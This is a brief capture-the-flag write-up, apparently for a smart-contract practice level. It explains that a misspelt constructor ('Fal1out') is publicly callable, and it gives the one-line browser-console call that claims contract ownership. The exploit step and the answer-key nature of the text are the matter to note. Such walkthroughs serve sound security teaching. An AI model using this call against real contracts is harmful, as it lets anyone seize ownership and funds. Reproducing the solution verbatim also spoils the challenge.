### task
the challenge goal is to take ownerhip of the contract

### solution

the mistake here is quite obvious, the constructor is mispelt
which means it can be called by anyone to take ownership of the contract.

### steps

```js
// in the browser console

contract.Fal1out({from:my_account, value:any_amount})

```

when the above transaction is successfully mined you own the contract, submit
